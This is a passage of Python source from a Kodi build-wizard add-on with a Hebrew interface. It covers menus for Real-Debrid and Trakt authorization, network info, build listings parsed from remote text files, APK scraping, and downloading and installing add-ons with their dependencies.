			msg  = "[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, '')
			wiz.ForceFastUpDate(ADDONTITLE, msg)

		
#############RD AND TRAKT SETUP##############	
def rdsetup():	
	addFile('אימות חשבון RD אוטומטי'  ,'setrd2',      icon=ICONMAINT,   themeit=THEME1)
	addFile('אימות חשבון RD ידני'  ,'setrd',      icon=ICONMAINT,   themeit=THEME1)
	#addFile('הגדר את הבילד למצב RD - הפעל'  ,'rdon',      icon=ICONMAINT,   themeit=THEME1)
	addFile('אימות חשבון Trakt'  ,'traktsync',      icon=ICONMAINT,   themeit=THEME1)
	addFile('ביטול RD'  ,'rdoff',      icon=ICONMAINT,   themeit=THEME1)


def traktsetup():	
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset', fanart=FANART,icon=ICONTRAKT, themeit=THEME2)
	setView('files', 'viewType')
def setautorealdebrid():
    from resources.libs import real_debrid
    rd = real_debrid.RealDebridFirst()
    rd.auth()
    # rdon()
def setrealdebrid():
    z=(ADDON.getSetting("auto_rd"))
    if z == 'false':
       ADDON.openSettings()
    else:
        from resources.libs import real_debrid
        rd = real_debrid.RealDebrid()
        rd.auth()
    # rd = real_debrid.RealDebrid()
    # rd_domains=(rd.getRelevantHosters())
        rdon()
    
def resolveurlsetup():
	xbmc.executebuiltin("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")
def urlresolversetup():
	xbmc.executebuiltin("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")
	
def placentasetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")
def reptiliasetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")
def flixnetsetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")
def yodasetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")
def numberssetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")
def uranussetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")
def genesissetup():
	xbmc.executebuiltin("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")
################################################
def net_tools(view=None):
	addFile ('Speed Tester' ,'speed', icon=ICONAPK, themeit=THEME1)
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	#addDir ('View IP Address & MAC Address',        'viewIP',    icon=ICONMAINT, themeit=THEME1)
	setView('files', 'viewType')
def speedMenu():
	xbmc.executebuiltin('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')
def viewIP():
	infoLabel = ['System.FriendlyName', 
				 'System.BuildVersion', 
				 'System.CpuUsage',
				 'System.ScreenMode',
				 'Network.IPAddress',
				 'Network.MacAddress',
				 'System.Uptime',
				 'System.TotalUptime',
				 'System.FreeSpace',
				 'System.UsedSpace',
				 'System.TotalSpace',
				 'System.Memory(free)',
				 'System.Memory(used)',
				 'System.Memory(total)']
	data      = []; x = 0
	for info in infoLabel:
		temp = wiz.getInfo(info)
		y = 0
		while temp == "Busy" and y < 10:
			temp = wiz.getInfo(info); y += 1; wiz.log("%s sleep %s" % (info, str(y))); xbmc.sleep(1000)
		data.append(temp)
		x += 1
	exter_ip, provider, location = getIP()
	addFile('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[4]), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, exter_ip), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, provider), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, location), '', icon=ICONMAINT, themeit=THEME2)
	addFile('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR1, COLOR2, data[5]), '', icon=ICONMAINT, themeit=THEME2)
	setView('files', 'viewType')

def buildMenu():
	if USERNAME == '' or PASSWORD == '':
		ADDON.openSettings()
		# sys.exit()
	# if PASSWORD == '':
		# ADDON.openSettings()
	build_f=u_list(SPEEDFILE)
	(build_f)
	WORKINGURL = (wiz.workingURL(build_f))
	(WORKINGURL)
	WORKINGURL = wiz.workingURL(SPEEDFILE)
	if not WORKINGURL == True:
		addFile('%s גירסה: %s' % (MCNAME, KODIV), '', icon=ICONBUILDS, themeit=THEME3)
		addDir ('כניסה לשמירת נתונים'       ,'savedata', icon=ICONSAVE,     themeit=THEME3)
		if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		addFile('בילדים לא זמינים אנא בדוק את חיבור האינטרנט', '', icon=ICONBUILDS, themeit=THEME3)
		addFile('%s' % WORKINGURL, '', icon=ICONBUILDS, themeit=THEME3)
	else:
		total, count15, count16, count17, count18, adultcount, hidden = wiz.buildCount()
		third = False; addin = []
		if THIRDPARTY == 'true':
			if not THIRD1NAME == '' and not THIRD1URL == '': third = True; addin.append('1')
			if not THIRD2NAME == '' and not THIRD2URL == '': third = True; addin.append('2')
			if not THIRD3NAME == '' and not THIRD3URL == '': third = True; addin.append('3')
		link  = wiz.openURL(SPEEDFILE).replace('\n','').replace('\r','').replace('\t','').replace('gui=""', 'gui="http://"').replace('theme=""', 'theme="http://"').replace('adult=""', 'adult="no"')
		match = re.compile('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall(link)
		if total == 1 and third == False:
			for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
				if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
				if not DEVELOPER == 'true' and wiz.strTest(name): continue
				viewBuild(match[0][0])
				return
		#addFile('%s גירסה: %s' % (MCNAME, KODIV), '', icon=ICONBUILDS, themeit=THEME3)
		#addDir ('כניסה לשמירת נתונים'       ,'savedata', icon=ICONSAVE,     themeit=THEME3)
		addFile ('עדכון מהיר'   ,'fastupdate',   icon=ICONSAVE,   themeit=THEME1)
		if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		if third == True:
			for item in addin:
				name = eval('THIRD%sNAME' % item)
				#addDir ("[B]%s[/B]" % name, 'viewthirdparty', item, icon=ICONBUILDS, themeit=THEME3)
		if len(match) >= 1:
			if SEPERATE == 'true':
				for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
					if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
					if not DEVELOPER == 'true' and wiz.strTest(name): continue
					menu = createMenu('install', '', name)
					addDir('[%s] %s (v%s)' % (float(kodi), name, version), 'viewbuild', name, description=description, fanart=fanart,icon=icon, menu=menu, themeit=THEME2)
			else:
				if count17 > 0: #and KODIV == 17.6:
					state = '+' if SHOW17 == 'false' else '-'
					#addFile('[B]%s בילדים לקודי 17 (%s)[/B]' % (state, count17), 'togglesetting',  'show17', themeit=THEME3)
					if SHOW17 == 'true':
					#if KODIV == 17.6:
						for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
							if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
							if not DEVELOPER == 'true' and wiz.strTest(name): continue
							kodiv = int(float(kodi))
							if kodiv == 17:
								menu = createMenu('install', '', name)
								addDir('[%s] %s (v%s)' % (float(kodi), name, version), 'viewbuild', name, description=description, fanart=fanart,icon=icon, menu=menu, themeit=THEME2)
				if count18 > 0:#and KODIV == 18.2:
					state = '+' if SHOW18 == 'false' else '-'
					#addFile('[B]%s בילדים לקודי 18 (%s)[/B]' % (state, count18), 'togglesetting',  'show17', themeit=THEME3)
					if SHOW18 == 'true':
					#if KODIV > 18:
						for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
							if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
							if not DEVELOPER == 'true' and wiz.strTest(name): continue
							kodiv = int(float(kodi))
							if kodiv == 18:
								menu = createMenu('install', '', name)
								addDir('[%s] %s (v%s)' % (float(kodi), name, version), 'viewbuild', name, description=description, fanart=fanart,icon=icon, menu=menu, themeit=THEME2)
				if count16 > 0:
					state = '+' if SHOW16 == 'false' else '-'
					addFile('[B]%s Jarvis Builds(%s)[/B]' % (state, count16), 'togglesetting',  'show16', themeit=THEME3)
					if SHOW16 == 'true':
						for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
							if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
							if not DEVELOPER == 'true' and wiz.strTest(name): continue
							kodiv = int(float(kodi))
							if kodiv == 16:
								menu = createMenu('install', '', name)
								addDir('[%s] %s (v%s)' % (float(kodi), name, version), 'viewbuild', name, description=description, fanart=fanart,icon=icon, menu=menu, themeit=THEME2)
				if count15 > 0:
					state = '+' if SHOW15 == 'false' else '-'
					addFile('[B]%s Isengard and Below Builds(%s)[/B]' % (state, count15), 'togglesetting',  'show15', themeit=THEME3)
					if SHOW15 == 'true':
						for name, version, url, gui, kodi, theme, icon, fanart, adult, description in match:
							if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
							if not DEVELOPER == 'true' and wiz.strTest(name): continue
							kodiv = int(float(kodi))
							if kodiv <= 15:
								menu = createMenu('install', '', name)
								addDir('[%s] %s (v%s)' % (float(kodi), name, version), 'viewbuild', name, description=description, fanart=fanart,icon=icon, menu=menu, themeit=THEME2)
		elif hidden > 0: 
			if adultcount > 0:
				addFile('There is currently only Adult builds', '', icon=ICONBUILDS, themeit=THEME3)
				addFile('Enable Show Adults in Addon Settings > Misc', '', icon=ICONBUILDS, themeit=THEME3)
			else:
				addFile('Currently No Builds Offered from %s' % ADDONTITLE, '', icon=ICONBUILDS, themeit=THEME3)
		else: addFile('Text file for builds not formated correctly.', '', icon=ICONBUILDS, themeit=THEME3)
	setView('files', 'viewType')

def viewBuild(name):
	WORKINGURL = wiz.workingURL(SPEEDFILE)
	if not WORKINGURL == True:
		addFile('בילדים לא זמינים אנא בדוק את חיבור האינטרנט', '', themeit=THEME3)
		addFile('%s' % WORKINGURL, '', themeit=THEME3)
		return
	if wiz.checkBuild(name, 'version') == False: 
		addFile('Error reading the txt file.', '', themeit=THEME3)
		addFile('%s was not found in the builds list.' % name, '', themeit=THEME3)
		return
	link = wiz.openURL(SPEEDFILE).replace('\n','').replace('\r','').replace('\t','').replace('gui=""', 'gui="http://"').replace('theme=""', 'theme="http://"')
	match = re.compile('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"' % name).findall(link)
	for version, url, gui, kodi, themefile, icon, fanart, preview, adult, description in match:
		icon        = icon   if wiz.workingURL(icon)   else ICON
		fanart      = fanart if wiz.workingURL(fanart) else FANART
		build       = '%s (v%s)' % (name, version)
		if BUILDNAME == name and version > BUILDVERSION:
			build = '%s [COLOR red][CURRENT v%s][/COLOR]' % (build, BUILDVERSION)
		#addFile(build, '', description=description, fanart=fanart, icon=icon, themeit=THEME4)
		#if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		#addDir ('כניסה לשמירת נתונים',       'savedata', icon=ICONSAVE,     themeit=THEME3)
		#addFile('מידע על הבילד',    'buildinfo', name, description=description, fanart=fanart, icon=icon, themeit=THEME3)
		#if not preview == "http://": addFile('הצג סרטון הדגמה', 'buildpreview', name, description=description, fanart=fanart, icon=icon, themeit=THEME3)
		#addFile('קבל קוד'   , 'getpass', name, 'getpass'  , description=description, fanart=fanart, icon=icon, themeit=THEME1)
		#addFile('הכנס סיסמה'   , 'setpass', name, 'setpass'  ,  themeit=THEME1)
		#if not gui == 'http://': addFile('עדכון מהיר'    , 'install', name, 'gui'     , description=description, fanart=fanart, icon=icon, themeit=THEME1)
		temp1 = int(float(KODIV)); temp2 = int(float(kodi))
		if not temp1 == temp2: 
			if temp1 == 16 and temp2 <= 15: warning = False
			else: warning = True
		else: warning = False
		#if warning == True:
			#addFile('[I]Build designed for kodi version %s(installed: %s)[/I]' % (str(kodi), str(KODIV)), '', fanart=fanart, icon=icon, themeit=THEME3)
		#if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		addFile('התקנה'   , 'install', name, 'fresh'  , description=description, fanart=fanart, icon=icon, themeit=THEME1)
		#addFile('התקנה רגילה - שומר הרחבות קיימות', 'install', name, 'normal' , description=description, fanart=fanart, icon=icon, themeit=THEME1)
		#if not gui == 'http://': addFile('עדכון מהיר'    , 'install', name, 'gui'     , description=description, fanart=fanart, icon=icon, themeit=THEME1)
		if not themefile == 'http://':
			if wiz.workingURL(themefile) == True:
				addFile(wiz.sep('THEMES'), '', fanart=fanart, icon=icon, themeit=THEME3)
				link  = wiz.openURL(themefile).replace('\n','').replace('\r','').replace('\t','')
				match = re.compile('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall(link)
				for themename, themeurl, themeicon, themefanart, themeadult, description in match:
					if not SHOWADULT == 'true' and themeadult.lower() == 'yes': continue
					themeicon   = themeicon   if themeicon   == 'http://' else icon
					themefanart = themefanart if themefanart == 'http://' else fanart
					addFile(themename if not themename == BUILDTHEME else "[B]%s (Installed)[/B]" % themename, 'theme', name, themename, description=description, fanart=themefanart, icon=themeicon, themeit=THEME3)
	setView('files', 'viewType')

def viewThirdList(number):
	name = eval('THIRD%sNAME' % number)
	url  = eval('THIRD%sURL' % number)
	work = wiz.workingURL(url)
	if not work == True:
		addFile('Url for txt file not valid', '', icon=ICONBUILDS, themeit=THEME3)
		addFile('%s' % WORKINGURL, '', icon=ICONBUILDS, themeit=THEME3)
	else:
		type, buildslist = wiz.thirdParty(url)
		addFile("[B]%s[/B]" % name, '', themeit=THEME3)
		if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		if type:
			for name, version, url, kodi, icon, fanart, adult, description in buildslist:
				if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
				addFile("[%s] %s v%s" % (kodi, name, version), 'installthird', name, url, icon=icon, fanart=fanart, description=description, themeit=THEME2)
		else:
			for name, url, icon, fanart, description in buildslist:
				addFile(name, 'installthird', name, url, icon=icon, fanart=fanart, description=description, themeit=THEME2)

def editThirdParty(number):
	name  = eval('THIRD%sNAME' % number)
	url   = eval('THIRD%sURL' % number)
	name2 = wiz.getKeyboard(name, 'Enter the Name of the Wizard')
	url2  = wiz.getKeyboard(url, 'Enter the URL of the Wizard Text')
	
	wiz.setS('wizard%sname' % number, name2)
	wiz.setS('wizard%surl' % number, url2)

def apkScraper(name=""):
	if name == 'kodi':
		kodiurl1 = 'http://mirrors.kodi.tv/releases/android/arm/'
		kodiurl2 = 'http://mirrors.kodi.tv/releases/android/arm/old/'
		url1 = wiz.openURL(kodiurl1).replace('\n', '').replace('\r', '').replace('\t', '')
		url2 = wiz.openURL(kodiurl2).replace('\n', '').replace('\r', '').replace('\t', '')
		x = 0
		match1 = re.compile('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall(url1)
		match2 = re.compile('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall(url2)
		
		addFile("Official Kodi Apk\'s", themeit=THEME1)
		rc = False
		for url, name, size, date in match1:
			if url in ['../', 'old/']: continue
			if not url.endswith('.apk'): continue
			if not url.find('_') == -1 and rc == True: continue
			try:
				tempname = name.split('-')
				if not url.find('_') == -1:
					rc = True
					name2, v2 = tempname[2].split('_')
				else: 
					name2 = tempname[2]
					v2 = ''
				title = "[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]" % (COLOR1, tempname[0].title(), tempname[1], v2.upper(), name2, COLOR2, size.replace(' ', ''), COLOR1, date)
				download = urljoin(kodiurl1, url)
				addFile(title, 'apkinstall', "%s v%s%s %s" % (tempname[0].title(), tempname[1], v2.upper(), name2), download)
				x += 1
			except:
				wiz.log("Error on: %s" % name)
			
		for url, name, size, date in match2:
			if url in ['../', 'old/']: continue
			if not url.endswith('.apk'): continue
			if not url.find('_') == -1: continue
			try:
				tempname = name.split('-')
				title = "[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]" % (COLOR1, tempname[0].title(), tempname[1], tempname[2], COLOR2, size.replace(' ', ''), COLOR1, date)
				download = urljoin(kodiurl2, url)
				addFile(title, 'apkinstall', "%s v%s %s" % (tempname[0].title(), tempname[1], tempname[2]), download)
				x += 1
			except:
				wiz.log("Error on: %s" % name)
		if x == 0: addFile("Error Kodi Scraper Is Currently Down.")
	elif name == 'spmc':
		spmcurl1 = 'https://github.com/koying/SPMC/releases'
		url1 = wiz.openURL(spmcurl1).replace('\n', '').replace('\r', '').replace('\t', '')
		x = 0
		match1 = re.compile('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall(url1)
		
		addFile("Official SPMC Apk\'s", themeit=THEME1)

		for name, urls in match1:
			tempurl = ''
			match2 = re.compile('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall(urls)
			for apkurl, apksize, apkname in match2:
				if apkname.find('armeabi') == -1: continue
				if apkname.find('launcher') > -1: continue
				tempurl = urljoin('https://github.com', apkurl)
				break

		if x == 0: addFile("Error SPMC Scraper Is Currently Down.")

def apkMenu(url=None):
	if url == None:
		#addDir ('Official Kodi Apk\'s', 'apkscrape', 'kodi', icon=ICONAPK, themeit=THEME1)
		#addDir ('Official SPMC Apk\'s', 'apkscrape', 'spmc', icon=ICONAPK, themeit=THEME1)
		if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	if not APKFILE == 'http://':
		if url == None:
			APKWORKING  = wiz.workingURL(APKFILE)
			TEMPAPKFILE = uservar.APKFILE
		else:
			APKWORKING  = wiz.workingURL(url)
			TEMPAPKFILE = url
		if APKWORKING == True:
			link = wiz.openURL(TEMPAPKFILE).replace('\n','').replace('\r','').replace('\t','')
			match = re.compile('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall(link)
			if len(match) > 0:
				x = 0
				for name, section, url, icon, fanart, adult, description in match:
					if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
					if section.lower() == 'yes':
						x += 1
						addDir ("[B]%s[/B]" % name, 'apk', url, description=description, icon=icon, fanart=fanart, themeit=THEME3)
					else:
						x += 1
						addFile(name, 'apkinstall', name, url, description=description, icon=icon, fanart=fanart, themeit=THEME2)
					if x < 1:
						addFile("No addons added to this menu yet!", '', themeit=THEME2)
			else: wiz.log("[APK Menu] ERROR: Invalid Format.", xbmc.LOGERROR)
		else: 
			wiz.log("[APK Menu] ERROR: URL for apk list not working.", xbmc.LOGERROR)
			addFile('Url for txt file not valid', '', themeit=THEME3)
			addFile('%s' % APKWORKING, '', themeit=THEME3)
		return
	else: wiz.log("[APK Menu] No APK list added.")
	setView('files', 'viewType')

def addonMenu(url=None):
	if not ADDONFILE == 'http://':
		if url == None:
			ADDONWORKING  = wiz.workingURL(ADDONFILE)
			TEMPADDONFILE = uservar.ADDONFILE
		else:
			ADDONWORKING  = wiz.workingURL(url)
			TEMPADDONFILE = url
		if ADDONWORKING == True:
			link = wiz.openURL(TEMPADDONFILE).replace('\n','').replace('\r','').replace('\t','').replace('repository=""', 'repository="none"').replace('repositoryurl=""', 'repositoryurl="http://"').replace('repositoryxml=""', 'repositoryxml="http://"')
			match = re.compile('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall(link)
			if len(match) > 0:
				x = 0
				for name, plugin, url, repository, repositoryxml, repositoryurl, icon, fanart, adult, description in match:
					if plugin.lower() == 'section':
						x += 1
						addDir ("[B]%s[/B]" % name, 'addons', url, description=description, icon=icon, fanart=fanart, themeit=THEME3)
					else:
						if not SHOWADULT == 'true' and adult.lower() == 'yes': continue
						try:
							add    = xbmcaddon.Addon(id=plugin).getAddonInfo('path')
							if os.path.exists(add):
								name   = "[COLOR green][Installed][/COLOR] %s" % name
						except:
							pass
						x += 1
						addFile(name, 'addoninstall', plugin, TEMPADDONFILE, description=description, icon=icon, fanart=fanart, themeit=THEME2)
					if x < 1:
						addFile("No addons added to this menu yet!", '', themeit=THEME2)
			else: 
				addFile('Text File not formated correctly!', '', themeit=THEME3)
				wiz.log("[Addon Menu] ERROR: Invalid Format.")
		else: 
			wiz.log("[Addon Menu] ERROR: URL for Addon list not working.")
			addFile('Url for txt file not valid', '', themeit=THEME3)
			addFile('%s' % ADDONWORKING, '', themeit=THEME3)
	else: wiz.log("[Addon Menu] No Addon list added.")
	setView('files', 'viewType')

def addonInstaller(plugin, url):
	if not ADDONFILE == 'http://':
		ADDONWORKING = wiz.workingURL(url)
		if ADDONWORKING == True:
			link = wiz.openURL(url).replace('\n','').replace('\r','').replace('\t','').replace('repository=""', 'repository="none"').replace('repositoryurl=""', 'repositoryurl="http://"').replace('repositoryxml=""', 'repositoryxml="http://"')
			match = re.compile('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"' % plugin).findall(link)
			if len(match) > 0:
				for name, url, repository, repositoryxml, repositoryurl, icon, fanart, adult, description in match:
					if os.path.exists(os.path.join(ADDONS, plugin)):
						do        = ['Launch Addon', 'Remove Addon']
						selected = DIALOG.select("[COLOR %s]Addon already installed what would you like to do?[/COLOR]" % COLOR2, do)
						if selected == 0:
							wiz.ebi('RunAddon(%s)' % plugin)
							xbmc.sleep(1000)
							return True
						elif selected == 1:
							wiz.cleanHouse(os.path.join(ADDONS, plugin))
							try: wiz.removeFolder(os.path.join(ADDONS, plugin))
							except: pass
							if DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like to remove the addon_data for:" % COLOR2, "[COLOR %s]%s[/COLOR]?[/COLOR]" % (COLOR1, plugin), yeslabel="[B][COLOR green]Yes Remove[/COLOR][/B]", nolabel="[B][COLOR red]No Skip[/COLOR][/B]"):
								removeAddonData(plugin)
							wiz.refresh()
							return True
						else:
							return False
					repo = os.path.join(ADDONS, repository)
					if not repository.lower() == 'none' and not os.path.exists(repo):
						wiz.log("Repository not installed, installing it")
						if DIALOG.yesno(ADDONTITLE, "[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:" % (COLOR2, COLOR1, plugin), "[COLOR %s]%s[/COLOR]?[/COLOR]" % (COLOR1, repository), yeslabel="[B][COLOR green]Yes Install[/COLOR][/B]", nolabel="[B][COLOR red]No Skip[/COLOR][/B]"): 
							ver = wiz.parseDOM(wiz.openURL(repositoryxml), 'addon', ret='version', attrs = {'id': repository})
							if len(ver) > 0:
								repozip = '%s%s-%s.zip' % (repositoryurl, repository, ver[0])
								wiz.log(repozip)
								if KODIV >= 17: wiz.addonDatabase(repository, 1)
								installAddon(repository, repozip)
								wiz.ebi('UpdateAddonRepos()')
								#wiz.ebi('UpdateLocalAddons()')
								wiz.log("Installing Addon from Kodi")
								install = installFromKodi(plugin)
								wiz.log("Install from Kodi: %s" % install)
								if install:
									wiz.refresh()
									return True
							else:
								wiz.log("[Addon Installer] Repository not installed: Unable to grab url! (%s)" % repository)
						else: wiz.log("[Addon Installer] Repository for %s not installed: %s" % (plugin, repository))
					elif repository.lower() == 'none':
						wiz.log("No repository, installing addon")
						pluginid = plugin
						zipurl = url
						installAddon(plugin, url)
						wiz.refresh()
						return True
					else:
						wiz.log("Repository installed, installing addon")
						install = installFromKodi(plugin, False)
						if install:
							wiz.refresh()
							return True
					if os.path.exists(os.path.join(ADDONS, plugin)): return True
					ver2 = wiz.parseDOM(wiz.openURL(repositoryxml), 'addon', ret='version', attrs = {'id': plugin})
					if len(ver2) > 0:
						url = "%s%s-%s.zip" % (url, plugin, ver2[0])
						wiz.log(str(url))
						if KODIV >= 17: wiz.addonDatabase(plugin, 1)
						installAddon(plugin, url)
						wiz.refresh()
					else: 
						wiz.log("no match"); return False
			else: wiz.log("[Addon Installer] Invalid Format")
		else: wiz.log("[Addon Installer] Text File: %s" % ADDONWORKING)
	else: wiz.log("[Addon Installer] Not Enabled.")

def installFromKodi(plugin, over=True):
	if over == True:
		xbmc.sleep(2000)
	#wiz.ebi('InstallAddon(%s)' % plugin)
	wiz.ebi('RunPlugin(plugin://%s)' % plugin)
	if not wiz.whileWindow('yesnodialog'):
		return False
	xbmc.sleep(1000)
	if wiz.whileWindow('okdialog'):
		return False
	wiz.whileWindow('progressdialog')
	if os.path.exists(os.path.join(ADDONS, plugin)): return True
	else: return False

def installAddon(name, url):
	if not wiz.workingURL(url) == True: wiz.LogNotify("[COLOR %s]Addon Installer[/COLOR]" % COLOR1, '[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]' % (COLOR1, name, COLOR2)); return
	if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
	DP.create(ADDONTITLE,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name), '', '[COLOR %s]אנא המתן[/COLOR]' % COLOR2)
	urlsplit = url.split('/')
	lib=os.path.join(PACKAGES, urlsplit[-1])
	try: os.remove(lib)
	except: pass
	downloader.download(url, lib, DP)
	title = '[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
	DP.update(0, title,'', '[COLOR %s]אנא המתן[/COLOR]' % COLOR2)
	percent, errors, error = extract.all(lib,ADDONS,DP, title=title)
	DP.update(0, title,'', '[COLOR %s]מתקין תלויות[/COLOR]' % COLOR2)
	installed(name)
	installDep(name, DP)
	DP.close()
	wiz.ebi('UpdateAddonRepos()')
	wiz.ebi('UpdateLocalAddons()')
	wiz.refresh()

def installDep(name, DP=None):
	dep=os.path.join(ADDONS,name,'addon.xml')
	if os.path.exists(dep):
		source = open(dep,mode='r'); link = source.read(); source.close(); 
		match  = wiz.parseDOM(link, 'import', ret='addon')
		for depends in match:
			if not 'xbmc.python' in depends:
				if not DP == None:
					DP.update(0, '', '[COLOR %s]%s[/COLOR]' % (COLOR1, depends))
				wiz.createTemp(depends)
				# continue
				# dependspath=os.path.join(ADDONS, depends)
				# if not os.path.exists(dependspath):
					# zipname = '%s-%s.zip' % (depends, match2[match.index(depends)])
					# depzip = urljoin("%s%s/" % (MODURL2, depends), zipname)
					# if not wiz.workingURL(depzip) == True:
						# depzip = urljoin(MODURL, '%s.zip' % depends)
						# if not wiz.workingURL(depzip) == True:
							# wiz.createTemp(depends)
							# if KODIV >= 17: wiz.addonDatabase(depends, 1)
							# continue
					# lib=os.path.join(PACKAGES, '%s.zip' % depends)
					# try: os.remove(lib)
					# except: pass
					# DP.update(0, '[COLOR %s][B]Downloading Dependency:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, depends),'', 'Please Wait')
					# downloader.download(depzip, lib, DP)
					# xbmc.sleep(100)
					# title = '[COLOR %s][B]Installing Dependency:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, depends)
					# DP.update(0, title,'', 'Please Wait')
					# percent, errors, error = extract.all(lib,ADDONS,DP, title=title)
					# if KODIV >= 17: wiz.addonDatabase(depends, 1)
					# installed(depends)
					# installDep(depends)
					# xbmc.sleep(100)
					# DP.close()

def installed(addon):
	url = os.path.join(ADDONS,addon,'addon.xml')
	if os.path.exists(url):
		try:
			list  = open(url,mode='r'); g = list.read(); list.close()
			name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': addon})
			icon  = os.path.join(ADDONS,addon,'icon.png')
			wiz.LogNotify('[COLOR %s]%s[/COLOR]' % (COLOR1, name[0]), '[COLOR %s]מאפשר הרחבות[/COLOR]' % COLOR2, '2000', icon)
